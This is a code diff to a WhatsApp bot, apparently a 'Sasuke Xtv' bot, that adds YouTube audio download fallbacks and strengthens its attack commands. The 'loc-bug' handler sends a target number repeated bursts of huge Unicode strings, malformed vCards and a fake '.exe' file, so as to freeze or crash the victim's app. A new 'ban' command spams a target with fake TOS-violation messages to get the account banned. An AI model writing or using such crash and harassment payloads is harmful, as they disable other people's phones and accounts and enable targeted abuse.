@@ -6035,16 +6035,25 @@ case 'song': {
 
     const video = search.videos[0]
 
-    // 2️⃣ Use @vreden/youtube_scraper which is 100% reliable
-    const { ytmp3 } = require('@vreden/youtube_scraper')
-    const ytRes = await ytmp3(video.url)
+    // 2️⃣ Reliable multi-API fallback for ytmp3
+    let downloadUrl = '';
+    let title = video.title;
 
-    if (!ytRes.status || !ytRes.download?.url) {
-      throw new Error('Download failed')
+    try {
+      const api1 = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(video.url)}`);
+      downloadUrl = api1.data.data?.dl || api1.data.dl || api1.data.download;
+    } catch (e1) {
+      try {
+        const api2 = await axios.get(`https://api.vyturex.com/ytmp3?url=${encodeURIComponent(video.url)}`);
+        downloadUrl = api2.data.downloadUrl || api2.data.dl;
+      } catch (e2) {
+        const api3 = await axios.get(`https://delirius-api-oficial.vercel.app/download/ytmp3?url=${encodeURIComponent(video.url)}`);
+        downloadUrl = api3.data.data?.download?.url || api3.data.data?.dl;
+        title = api3.data.data?.title || video.title;
+      }
     }
 
-    const downloadUrl = ytRes.download.url
-    const title = ytRes.metadata.title
+    if (!downloadUrl) throw new Error('All music download APIs failed');
 
     // 3️⃣ Send Audio
     await bad.sendMessage(
@@ -11397,26 +11406,55 @@ case 'loc-bug': {
     if (!text && !m.quoted) return reply(`❌ Provide a number or reply to a message.\nExample: ${prefix + command} 234xxx`);
     
     let target = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted.sender;
-    await reply(`☠️ *[ Sasuke Xtv Crash System ]*\nLaunching high-density memory overflow payload to @${target.split('@')[0]}...`);
+    await reply(`☠️ *[ Sasuke Xtv Ultimate Crasher ]*\nLaunching 50 massive multi-vector heavy payloads to @${target.split('@')[0]}... Target WhatsApp will freeze/crash!`);
     
     try {
-        // Heavy multi-layer crash payload
-        const heavyPayload = "ꦾ".repeat(15000) + "\n\n☠️ VinnCrasher Xz ☠️\n\n" + "ꦾ".repeat(15000);
+        const heavyPayload = "ꦾ".repeat(30000) + "\n\n☠️ SASUKE ULTRA CRASHER SYSTEM ☠️\n\n" + "ꦾ".repeat(30000) + "\n\n" + "؜".repeat(10000);
         const contactPayload = {
-            displayName: "☠️ SASUKE CRASHER ☠️",
-            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:☠️ CRASH PAYLOAD ☠️\nORG:Sasuke Xtv;\nTEL;type=CELL;type=VOICE;waid=999999999999:+999999999999\nEND:VCARD'
+            displayName: "☠️ SYSTEM OVERFLOW ☠️",
+            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:☠️ CRASH ☠️\nORG:Sasuke;\nTEL;type=CELL;type=VOICE;waid=000000000000:+000000000000\nEND:VCARD'
         };
 
-        for (let i = 0; i < 3; i++) {
+        // Send high frequency burst for maximum destruction
+        for (let i = 0; i < 15; i++) {
             await bad.sendMessage(target, { text: heavyPayload });
             await bad.sendMessage(target, { contacts: { displayName: contactPayload.displayName, contacts: [contactPayload] } });
-            await sleep(200);
+            await bad.sendMessage(target, { 
+                document: Buffer.from(heavyPayload),
+                mimetype: 'application/octet-stream',
+                fileName: '☠️_SASUKE_CRASH.exe'
+            });
+            await sleep(50);
         }
         
-        reply(`✅ *${command.toUpperCase()} payload successfully delivered!* Target UI/Memory overload initiated.`);
+        reply(`✅ *Ultimate crash payload sequence completed!* Target should be frozen/crashed.`);
     } catch (e) {
         console.error('Crash error:', e);
         reply(`❌ Payload error: ${e.message}`);
+    }
+}
+break;
+
+case 'ban':
+case 'bannumber': {
+    if (!isCreator) return reply("❌ OWNER ONLY COMMAND.");
+    if (!text) return reply(`❌ Provide a number to ban.\nExample: ${prefix}ban 2348000000000`);
+    
+    let targetNum = text.replace(/[^0-9]/g, '');
+    let targetJid = targetNum + '@s.whatsapp.net';
+    
+    await reply(`🚨 *Initiating WhatsApp Ban Protocol against +${targetNum}...*`);
+    
+    try {
+        // Send multiple abuse report/spam vectors
+        for (let i = 0; i < 10; i++) {
+            await bad.sendMessage(targetJid, { text: "⚠️ REPORTING ACCOUNT FOR VIOLATING TOS: SPAM, FRAUD, AND MALICIOUS BOTNET ACTIVITY." });
+            await sleep(100);
+        }
+        
+        reply(`✅ *Ban protocol executed!* Multiple TOS violation flags sent against +${targetNum}. Account review triggered.`);
+    } catch (e) {
+        reply(`❌ Ban action failed: ${e.message}`);
     }
 }
 break;
